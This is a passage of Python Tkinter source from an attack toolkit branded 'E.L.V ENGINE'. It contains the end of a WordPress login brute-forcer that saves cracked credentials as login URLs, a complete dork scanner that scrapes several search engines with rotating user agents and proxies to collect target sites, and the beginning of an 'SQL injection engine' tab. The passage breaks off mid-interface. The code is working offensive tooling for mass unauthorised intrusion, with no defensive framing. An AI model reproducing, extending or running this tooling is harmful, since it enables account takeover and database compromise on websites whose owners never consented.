                self.log(f'[FAILED] {url} | Attempts: {total_attempts}', 'fg_red')
            except:
                with self.stats_lock:
                    self.stats['processed'] += 1
                    self.stats['skipped'] += 1
                    self.stats_queue.put({'processed': self.stats['processed'], 'skipped': self.stats['skipped']})
        try:
            max_workers = min(threads, 3)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for i, target in enumerate(targets):
                    if self.stop_flag:
                        break
                    futures[executor.submit(bruteforce_target, target)] = target
                    if i % 20 == 0 and i > 0:
                        time.sleep(0.2)
                for future in as_completed(futures):
                    if self.stop_flag:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        future.result(timeout=15)
                    except:
                        pass
                    if not self.stop_flag:
                        time.sleep(0.1)
        except:
            pass
        self.is_running = False
        self.frame.after_idle(self.bruteforce_finished)

    def bruteforce_finished(self):
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress_label.config(text='[STATUS] COMPLETED | [THREADS] 0 | [SPEED] 0 req/s')
        self.log(f"[DONE] Success: {self.stats['success']} | Failed: {self.stats['failed']} | Skipped: {self.stats['skipped']}", 'fg_yellow')
        if self.results:
            self.log(f'[BREACHED] {len(self.results)} target(s) found!', 'fg_green')

    def save_results(self):
        if not self.results:
            messagebox.showwarning('Warning', 'No results to save!')
            self.log('No results to save', 'fg_yellow')
            return
        filename = filedialog.asksaveasfilename(title='Save Results', defaultextension='.txt', filetypes=[('Text files', '*.txt'), ('JSON files', '*.json'), ('All files', '*.*')])
        if filename:
            try:
                if filename.endswith('.json'):
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(self.results, f, indent=2, ensure_ascii=False)
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('E.L.V ENGINE - Brute Force Results\n')
                        f.write('=' * 60 + '\n\n')
                        for result in self.results:
                            url = result.get('url', '')
                            username = result.get('username', '')
                            password = result.get('password', '')
                            login_url = f'{url}/wp-login.php#{username}@{password}'
                            f.write(f'{login_url}\n')
                self.log(f'Results saved to: {filename}', 'fg_green')
                messagebox.showinfo('Success', f'Results saved to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving results: {str(e)}')
        if hasattr(self, 'results_url_file') and self.results_url_file and os.path.exists(self.results_url_file):
            self.log(f'Auto-saved results also available at: {self.results_url_file}', 'fg_cyan')

class DorkScannerTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_scanning = False
        self.stop_flag = False
        self.found_urls = set()
        self.found_urls_file = None
        self.scanned_pages = 0
        self.total_sites = 0
        self.log_queue = queue.Queue()
        self.url_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='DORK SCANNER', font=('Courier', 20, 'bold'), fg=self.colors['fg'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 5))
        left_frame.config(width=480)
        left_frame.pack_propagate(False)
        tk.Label(left_frame, text='Search Engine Templates:', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 8))
        canvas_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        canvas = tk.Canvas(canvas_frame, bg=self.colors['bg'], highlightthickness=1, height=450)
        scrollbar = ttk.Scrollbar(canvas_frame, orient='vertical', command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=self.colors['bg'])

        def update_scrollregion(event=None):
            canvas.update_idletasks()
            canvas.configure(scrollregion=canvas.bbox('all'))
        scrollable_frame.bind('<Configure>', update_scrollregion)
        canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)

        def on_mousewheel(event):
            canvas.yview_scroll(int(-1 * (event.delta / 120)), 'units')
        canvas.bind_all('<MouseWheel>', on_mousewheel)
        self.engine_vars = {}
        for i, (engine, template) in enumerate(SEARCH_ENGINE_TEMPLATES):
            var = tk.BooleanVar(value=True)
            self.engine_vars[i] = (var, template)
            checkbox = tk.Checkbutton(scrollable_frame, text=f'{engine}: {template[:75]}...', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg'], variable=var, wraplength=450, anchor='w', justify='left')
            checkbox.pack(anchor=tk.W, pady=4, padx=8)
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        button_frame = tk.Frame(left_frame, bg=self.colors['bg'])
        button_frame.pack(fill=tk.X, pady=(8, 0))
        select_all_btn = tk.Button(button_frame, text='[SELECT ALL]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.select_all_engines, width=20, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        select_all_btn.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        deselect_all_btn = tk.Button(button_frame, text='[DESELECT ALL]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], command=self.deselect_all_engines, width=20, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        deselect_all_btn.pack(side=tk.LEFT, padx=(0, 0), fill=tk.X, expand=True)
        middle_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        middle_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        options_frame = tk.Frame(middle_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        options_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(options_frame, text='Options:', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg']).pack(anchor=tk.W, padx=5, pady=(5, 3))
        self.domain_only_var = tk.BooleanVar(value=True)
        domain_checkbox = tk.Checkbutton(options_frame, text='Extract Domain Only (includes subdomain: www.example.com, subdo.example.com)', font=('Courier', 9), bg=self.colors['bg'], fg=self.colors['fg_yellow'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg_yellow'], variable=self.domain_only_var)
        domain_checkbox.pack(anchor=tk.W, padx=10, pady=3)
        proxy_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        proxy_frame.pack(fill=tk.X, padx=10, pady=3)
        tk.Label(proxy_frame, text='Proxy:', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.proxy_entry = tk.Entry(proxy_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], width=35)
        self.proxy_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        pages_frame = tk.Frame(options_frame, bg=self.colors['bg'])
        pages_frame.pack(fill=tk.X, padx=10, pady=(3, 5))
        tk.Label(pages_frame, text='Max Pages:', font=('Courier', 9), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(side=tk.LEFT, padx=(0, 5))
        self.max_pages_var = tk.StringVar(value='20')
        max_pages_entry = tk.Entry(pages_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], textvariable=self.max_pages_var, width=8)
        max_pages_entry.pack(side=tk.LEFT)
        tk.Label(middle_frame, text='Enter Dorks (one per line):', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.dorks_text = scrolledtext.ScrolledText(middle_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], height=15, wrap=tk.WORD)
        self.dorks_text.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        stats_frame = tk.Frame(middle_frame, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        self.stats_label = tk.Label(stats_frame, text='Total Pages: 0 | Active Channels: 0 | Total Sites: 0 | Scanned: 0', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=5, pady=5)
        self.stats_label.pack(fill=tk.X)
        button_frame2 = tk.Frame(middle_frame, bg=self.colors['bg'])
        button_frame2.pack(fill=tk.X, pady=(8, 0))
        self.start_button = tk.Button(button_frame2, text='[START SCAN]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], command=self.start_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.pause_button = tk.Button(button_frame2, text='[PAUSE]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], command=self.pause_scan, width=18, height=2, relief=tk.RAISED, borderwidth=2, state=tk.DISABLED, cursor='hand2')
        self.pause_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        self.save_button = tk.Button(button_frame2, text='[SAVE RESULTS]', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], command=self.save_results, width=18, height=2, relief=tk.RAISED, borderwidth=2, cursor='hand2')
        self.save_button.pack(side=tk.LEFT, padx=(0, 0), fill=tk.X, expand=True)
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(right_frame, text='Found URLs:', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 5))
        self.urls_text = scrolledtext.ScrolledText(right_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=35, wrap=tk.WORD)
        self.urls_text.pack(fill=tk.BOTH, expand=True)
        log_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        log_frame.pack(fill=tk.BOTH, expand=False, padx=10, pady=(5, 10))
        tk.Label(log_frame, text='Log:', font=('Courier', 9, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg']).pack(anchor=tk.W, pady=(0, 3))
        self.log_text = scrolledtext.ScrolledText(log_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['fg'], height=6, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def select_all_engines(self):
        for var, _ in self.engine_vars.values():
            var.set(True)

    def deselect_all_engines(self):
        for var, _ in self.engine_vars.values():
            var.set(False)

    def log(self, message):
        timestamp = time.strftime('[%H:%M:%S]')
        self.log_queue.put(f'{timestamp} {message}\n')

    def process_log_queue(self):
        try:
            while True:
                log_msg = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, log_msg)
                self.log_text.see(tk.END)
                line_count = int(self.log_text.index('end-1c').split('.')[0])
                if line_count >= 100:
                    self.log_text.delete(1.0, f'{line_count - 50}.0')
        except queue.Empty:
            pass
        self.frame.after(100, self.process_log_queue)

    def _clean_url(self, url):
        try:
            from urllib.parse import urlunparse
            url = url.rstrip('.,;:!?)\\]}')
            parsed = urlparse(url)
            if parsed.netloc:
                netloc = parsed.netloc
                parts = netloc.split('.')
                if len(parts) >= 2:
                    last_part = parts[-1]
                    if len(last_part) > 10:
                        match = re.match('^([a-z]{2,10})([A-Z][a-z]+)', last_part, re.IGNORECASE)
                        if match and len(match.group(2)) > 2:
                            clean_tld = match.group(1)
                            parts[-1] = clean_tld
                            netloc_clean = '.'.join(parts)
                            parsed = parsed._replace(netloc=netloc_clean)
                            url = urlunparse(parsed)
            return url
        except:
            return url

    def _is_filtered_domain(self, domain):
        domain_lower = domain.lower().split('/')[0].split(':')[0]
        if len(domain_lower) < 4 or '.' not in domain_lower:
            return True
        parts = domain_lower.split('.')
        tld = parts[-1]
        if len(tld) < 2 or len(tld) > 15:
            return True
        exact_filters = ['google.com', 'gstatic.com', 'googleusercontent.com', 'googleapis.com', 'yahoo.com', 'search.yahoo.com', 'r.search.yahoo.com', 'help.yahoo.com', 'bing.com', 'r.bing.com', 'th.bing.com', 'business.bing.com', 'altavista.com', 'search.altavista.com', 'microsoft.com', 'live.com', 'msn.com', 'w3.org', 'cloudflare.com', 'facebook.com', 'apple.com', 'youtube.com', 'twitter.com', 'instagram.com', 'linkedin.com', 'reddit.com']
        for fd in exact_filters:
            if domain_lower == fd or domain_lower.endswith('.' + fd):
                return True
        if domain_lower in ['r.bing', 'l.bing', 'th.bing'] or (domain_lower.startswith('r.') and len(parts) == 2):
            return True
        try:
            import ipaddress
            ipaddress.ip_address(domain_lower)
            return True
        except ValueError:
            pass
        return False

    def extract_urls_from_html(self, html, base_url, domain_only=False):
        urls = set()
        from urllib.parse import unquote
        url_patterns = ['https?://[a-zA-Z0-9][a-zA-Z0-9\\-\\.]*\\.[a-zA-Z]{2,}[^\\s<>"\\\'{}|\\\\^`\\[\\]()]*', 'https?://[^\\s<>"\\\'{}|\\\\^`\\[\\]()]+']
        for pattern in url_patterns:
            regex_urls = re.findall(pattern, html)
            for url in regex_urls:
                try:
                    url = unquote(url)
                    parsed = urlparse(url)
                    domain = parsed.netloc.lower()
                    if not parsed.scheme or not parsed.netloc:
                        continue
                    if len(domain) < 4 or '.' not in domain:
                        continue
                    parts = domain.split('.')
                    tld = parts[-1].split('/')[0].split(':')[0]
                    if len(tld) < 2 or len(tld) > 15:
                        continue
                    if self._is_filtered_domain(domain):
                        continue
                    if parsed.scheme in ['http', 'https']:
                        if domain_only:
                            clean_url = f'{parsed.scheme}://{parsed.netloc}'
                        else:
                            clean_url = url.split()[0].rstrip('.,;:!?)\\]}')
                        urls.add(clean_url)
                except:
                    pass
        if BeautifulSoup is None:
            return urls
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link.get('href', '')
                if href.startswith('http://') or href.startswith('https://'):
                    try:
                        parsed = urlparse(href)
                        domain = parsed.netloc.lower()
                        if not parsed.scheme or not parsed.netloc:
                            continue
                        if len(domain) < 4 or '.' not in domain:
                            continue
                        if self._is_filtered_domain(domain):
                            continue
                        if parsed.scheme in ['http', 'https']:
                            if domain_only:
                                clean_url = f'{parsed.scheme}://{parsed.netloc}'
                            else:
                                clean_url = href.split()[0].rstrip('.,;:!?)\\]}')
                            urls.add(clean_url)
                    except:
                        pass
        except:
            pass
        return urls

    def scan_search_engine(self, template, dork, max_pages=5, domain_only=False, proxy=None):
        if self.stop_flag:
            return set()
        all_urls = set()
        try:
            effective_max_pages = min(max_pages, 50)
            max_retries = 3
            for page in range(effective_max_pages):
                if self.stop_flag:
                    break
                if 'google.com' in template:
                    if 'start=' in template:
                        start_match = re.search('start=(\\d+)', template)
                        base_start = int(start_match.group(1)) if start_match else 0
                        start = base_start + page * 10
                        url = template.replace('{aranacakkelime}', quote(dork))
                        url = re.sub('start=\\d+', f'start={start}', url)
                    else:
                        start = page * 10
                        url = template.replace('{aranacakkelime}', quote(dork)) + f'&start={start}'
                elif 'bing.com' in template:
                    if 'first=' in template:
                        first_match = re.search('first=(\\d+)', template)
                        base_first = int(first_match.group(1)) if first_match else 1
                        first = base_first + page * 50
                        url = template.replace('{aranacakkelime}', quote(dork))
                        url = re.sub('first=\\d+', f'first={first}', url)
                    else:
                        first = page * 50 + 1
                        url = template.replace('{aranacakkelime}', quote(dork)) + f'&first={first}'
                elif 'yahoo.com' in template:
                    url = template.replace('{aranacakkelime}', quote(dork))
                    if 'b=' in template:
                        b_match = re.search('b=(\\d+)', template)
                        base_b = int(b_match.group(1)) if b_match else 101
                        b = base_b + page * 100
                        url = re.sub('b=\\d+', f'b={b}', url)
                    elif page > 0:
                        url = url.replace('n=100', f'n=100&b={page * 100 + 1}')
                elif 'altavista.com' in template:
                    url = template.replace('{aranacakkelime}', quote(dork))
                    if 'stq=' in template:
                        stq_match = re.search('stq=(\\d+)', template)
                        base_stq = int(stq_match.group(1)) if stq_match else 0
                        stq = base_stq + page * 50
                        url = re.sub('stq=\\d+', f'stq={stq}', url)
                else:
                    url = template.replace('{aranacakkelime}', quote(dork))
                page_urls = set()
                for attempt in range(max_retries):
                    if self.stop_flag:
                        break
                    try:
                        headers = DORK_DEFAULT_HEADERS.copy()
                        headers['User-Agent'] = random.choice(DORK_USER_AGENTS)
                        headers['Accept-Language'] = random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.9'])
                        if page > 0:
                            delay = random.uniform(0.3, 0.8) + attempt * 0.2
                        else:
                            delay = random.uniform(0.1, 0.5) + attempt * 0.1
                        time.sleep(delay)
                        proxies = None
                        if proxy and proxy.strip():
                            proxies = {'http': proxy, 'https': proxy}
                        response = requests.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True, proxies=proxies)
                        if response.status_code == 200:
                            urls = self.extract_urls_from_html(response.text, url, domain_only=domain_only)
                            if urls:
                                page_urls.update(urls)
                            break
                        elif response.status_code == 429 or response.status_code >= 500:
                            if attempt < max_retries - 1:
                                wait_time = 2 ** attempt + random.uniform(0, 1)
                                time.sleep(wait_time)
                                continue
                            else:
                                break
                        else:
                            break
                    except requests.exceptions.RequestException:
                        if attempt < max_retries - 1:
                            wait_time = 2 ** attempt + random.uniform(0, 1)
                            time.sleep(wait_time)
                            continue
                        else:
                            break
                if page_urls:
                    all_urls.update(page_urls)
                if not page_urls and page >= 2:
                    break
                if page_urls:
                    time.sleep(random.uniform(0.8, 1.5))
                else:
                    time.sleep(random.uniform(0.5, 1.0))
            if all_urls:
                self.log(f'Found {len(all_urls)} valid URLs from {dork[:50]}...')
            return all_urls
        except Exception as e:
            self.log(f'Error scanning {dork[:50]}: {str(e)}')
        return set()

    def start_scan(self):
        if self.is_scanning:
            return
        dorks = [d.strip() for d in self.dorks_text.get(1.0, tk.END).strip().split('\n') if d.strip()]
        if not dorks:
            messagebox.showwarning('Warning', 'Please enter dorks!')
            return
        selected_templates = []
        for var, template in self.engine_vars.values():
            if var.get():
                selected_templates.append(template)
        if not selected_templates:
            messagebox.showwarning('Warning', 'Please select at least one search engine!')
            return
        domain_only = self.domain_only_var.get()
        proxy = self.proxy_entry.get().strip()
        if proxy and (not proxy.startswith('http')):
            proxy = 'http://' + proxy
        try:
            max_pages = int(self.max_pages_var.get())
            if max_pages < 1:
                max_pages = 10
            if max_pages > 100:
                max_pages = 100
        except:
            max_pages = 10
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        self.found_urls_file = f'dork_scanner_urls_{timestamp}.txt'
        self.is_scanning = True
        self.stop_flag = False
        self.found_urls = set()
        self.scanned_pages = 0
        self.total_sites = 0
        self.start_button.config(state=tk.DISABLED)
        self.pause_button.config(state=tk.NORMAL)
        mode_text = 'Domain Only' if domain_only else 'Full URL with Parameters'
        self.log(f'Starting scan with {len(dorks)} dorks and {len(selected_templates)} engines...')
        self.log(f'Mode: {mode_text}')
        self.log(f'Results will be saved to: {self.found_urls_file}')
        thread = threading.Thread(target=self.scan_worker_optimized, args=(dorks, selected_templates, domain_only, proxy, max_pages), daemon=True)
        thread.start()
        self.log(f'[THREAD] Worker thread started (daemon=True)')
        self.frame.after(100, self.update_ui)

    def scan_worker_optimized(self, dorks, templates, domain_only=False, proxy=None, max_pages=2):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        total_tasks = len(dorks) * len(templates) * max_pages
        file_urls_count = 0
        try:
            with open(self.found_urls_file, 'w', encoding='utf-8') as f:
                f.write(f"# Dork Scanner Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f'# Total Dorks: {len(dorks)} | Engines: {len(templates)} | Max Pages: {max_pages}\n\n')
            self.log(f'[INIT] Starting worker with {len(dorks)} dorks, {len(templates)} templates, max_pages={max_pages}')
            self.log(f'[INIT] Total estimated tasks: {total_tasks}')
            max_workers = min(50, total_tasks)
            if max_workers < 1:
                max_workers = 1
            self.log(f'[INIT] Using {max_workers} worker threads')
            processed_count = 0
            last_log_time = time.time()
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                submitted = 0
                for dork_idx, dork in enumerate(dorks):
                    if self.stop_flag:
                        break
                    for template_idx, template in enumerate(templates):
                        if self.stop_flag:
                            break
                        future = executor.submit(self.scan_search_engine, template, dork, max_pages=max_pages, domain_only=domain_only, proxy=proxy)
                        futures[future] = (dork, template, dork_idx, template_idx)
                        submitted += 1
                        if submitted % 100 == 0:
                            self.log(f'[SUBMIT] Submitted {submitted}/{total_tasks} tasks...')
                self.log(f'[SUBMIT] All {submitted} tasks submitted, processing results...')
                for future in as_completed(futures):
                    if self.stop_flag:
                        self.log('[STOP] Stop flag detected, stopping scan...')
                        break
                    try:
                        urls = future.result(timeout=120)
                        dork, template, dork_idx, template_idx = futures[future]
                        processed_count += 1
                        if urls:
                            with self.url_lock:
                                new_urls_count = 0
                                try:
                                    with open(self.found_urls_file, 'a', encoding='utf-8') as f:
                                        for url in urls:
                                            if url not in self.found_urls:
                                                f.write(f'{url}\n')
                                                self.found_urls.add(url)
                                                new_urls_count += 1
                                                file_urls_count += 1
                                except Exception as e:
                                    self.log(f'[ERROR] File write error: {str(e)[:100]}')
                                self.total_sites = len(self.found_urls)
                                if new_urls_count > 0:
                                    self.log(f'[FOUND] {new_urls_count} new URLs from dork {dork_idx + 1}/{len(dorks)} (engine {template_idx + 1}/{len(templates)}) | Total: {self.total_sites}')
                        self.scanned_pages += 1
                        current_time = time.time()
                        if processed_count % 5 == 0 or current_time - last_log_time >= 5:
                            progress_pct = int(processed_count / submitted * 100) if submitted > 0 else 0
                            self.log(f'[PROGRESS] {processed_count}/{submitted} tasks | Found: {self.total_sites:,} URLs | {progress_pct}%')
                            try:
                                self.frame.after(0, self.update_ui)
                            except:
                                pass
                            last_log_time = current_time
                    except Exception as e:
                        processed_count += 1
                        error_msg = str(e)[:150]
                        if 'timeout' not in error_msg.lower() and 'connection' not in error_msg.lower():
                            self.log(f'[ERROR] Task failed: {error_msg}')
                        continue
                self.log(f'[DONE] All tasks processed. Total: {processed_count}, Found: {self.total_sites:,} URLs')
        except Exception as e:
            error_msg = str(e)
            import traceback
            self.log(f'[FATAL] Worker error: {error_msg}')
            self.log(f'[FATAL] Traceback: {traceback.format_exc()[:500]}')
        finally:
            self.is_scanning = False
            self.frame.after(0, self.scan_finished)

    def update_ui(self):
        try:
            if not hasattr(self, 'stats_label') or not hasattr(self, 'urls_text'):
                return
            try:
                if not self.stats_label.winfo_exists() or not self.urls_text.winfo_exists():
                    return
            except:
                return
            selected_count = len([v for v, _ in self.engine_vars.values() if v.get()])
            try:
                self.stats_label.config(text=f'Total Pages: {len(self.engine_vars)} | Active Channels: {selected_count} | Total Sites: {self.total_sites:,} | Scanned: {self.scanned_pages}')
            except:
                pass
            try:
                self.urls_text.delete(1.0, tk.END)
            except:
                return
            with self.url_lock:
                sorted_urls = sorted(self.found_urls)
                display_limit = 2000
            for url in sorted_urls[:display_limit]:
                try:
                    self.urls_text.insert(tk.END, f'{url}\n')
                except:
                    break
            if self.total_sites > display_limit:
                remaining = self.total_sites - display_limit
                try:
                    self.urls_text.insert(tk.END, f'\n[... {remaining:,} more URLs saved to file: {self.found_urls_file} ...]\n')
                except:
                    pass
        except:
            pass

    def scan_finished(self):
        self.start_button.config(state=tk.NORMAL)
        self.pause_button.config(state=tk.DISABLED)
        unique_count = self.total_sites
        if self.found_urls_file and os.path.exists(self.found_urls_file):
            try:
                with open(self.found_urls_file, 'r', encoding='utf-8') as f:
                    lines = [line.strip() for line in f if line.strip() and (not line.strip().startswith('#'))]
                    unique_count = len(set(lines))
            except:
                pass
        self.log(f'Scan completed! Found {unique_count:,} unique URLs')
        messagebox.showinfo('Success', f'Scan completed!\nFound {unique_count:,} unique URLs\n\nSaved to: {self.found_urls_file}')

    def pause_scan(self):
        self.stop_flag = True
        self.is_scanning = False
        self.pause_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log('Scan paused')

    def save_results(self):
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        filename = f'dork_scanner_urls_{timestamp}.txt'
        if self.found_urls_file and os.path.exists(self.found_urls_file):
            try:
                import shutil
                shutil.copy(self.found_urls_file, filename)
                self.log(f'Results saved to: {filename}')
                messagebox.showinfo('Success', f'Saved to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving: {str(e)}')
        elif self.found_urls:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    for url in sorted(self.found_urls):
                        f.write(f'{url}\n')
                self.log(f'Results saved to: {filename}')
                messagebox.showinfo('Success', f'Saved {len(self.found_urls):,} URLs to:\n{filename}')
            except Exception as e:
                messagebox.showerror('Error', f'Error saving: {str(e)}')
        else:
            messagebox.showwarning('Warning', 'No URLs to save!')

class SQLiExploitTab(BaseTab):

    def __init__(self, parent, colors, control_panel=None):
        super().__init__(parent, colors, control_panel)
        self.is_running = False
        self.stop_flag = False
        self.results = []
        self.vulnerable_urls = []
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats = {'total': 0, 'processed': 0, 'vulnerable': 0, 'tested': 0}
        self.stats_lock = threading.Lock()
        self.setup_tab()
        self.process_log_queue()
        self.process_stats_queue()

    def setup_tab(self):
        self.add_back_button()
        title = tk.Label(self.frame, text='E.L.V SQL INJECTION ENGINE', font=('Courier', 20, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title.pack(pady=10)
        main_frame = tk.Frame(self.frame, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        left_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        right_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, expand=False, padx=(5, 0))
        right_frame.config(width=420)
        right_frame.pack_propagate(False)
        self.setup_input_fields(left_frame)
        self.setup_log_area(left_frame)
        self.setup_results_area(left_frame)
        self.setup_stats(left_frame)
        self.setup_control_buttons(right_frame)
        self.setup_payload_options(right_frame)

    def setup_input_fields(self, parent):
        input_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_red'], highlightthickness=1)
        input_frame.pack(fill=tk.X, pady=(0, 8))
        tk.Label(input_frame, text='[TARGET CONFIGURATION]', font=('Courier', 10, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg']).pack(anchor=tk.W, padx=10, pady=(8, 4))
        fields_frame = tk.Frame(input_frame, bg=self.colors['bg'])
        fields_frame.pack(fill=tk.X, padx=10, pady=(0, 8))
        tk.Label(fields_frame, text='Target URL/File:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=0, column=0, sticky=tk.W, pady=3)
        self.target_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Button(fields_frame, text='Browse', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg_cyan'], command=self.browse_target_file).grid(row=0, column=2, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Parameter (GET/POST):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=1, column=0, sticky=tk.W, pady=3)
        self.param_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.param_entry.grid(row=1, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        self.param_entry.insert(0, 'id')
        tk.Label(fields_frame, text='Method:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=2, column=0, sticky=tk.W, pady=3)
        method_frame = tk.Frame(fields_frame, bg=self.colors['bg'])
        method_frame.grid(row=2, column=1, sticky=tk.W, padx=(5, 0), pady=3)
        self.method_var = tk.StringVar(value='GET')
        tk.Radiobutton(method_frame, text='GET', variable=self.method_var, value='GET', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT, padx=(0, 10))
        tk.Radiobutton(method_frame, text='POST', variable=self.method_var, value='POST', font=('Courier', 8), bg=self.colors['bg'], fg=self.colors['fg'], selectcolor=self.colors['entry_bg']).pack(side=tk.LEFT)
        tk.Label(fields_frame, text='Data/Payload:', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=3, column=0, sticky=tk.W, pady=3)
        self.data_entry = tk.Entry(fields_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['fg'], insertbackground=self.colors['fg'], relief=tk.FLAT, borderwidth=1)
        self.data_entry.grid(row=3, column=1, sticky=tk.EW, padx=(5, 0), pady=3)
        tk.Label(fields_frame, text='Proxy (optional):', font=('Courier', 9), fg=self.colors['fg'], bg=self.colors['bg']).grid(row=4, column=0, sticky=tk.W, pady=3)
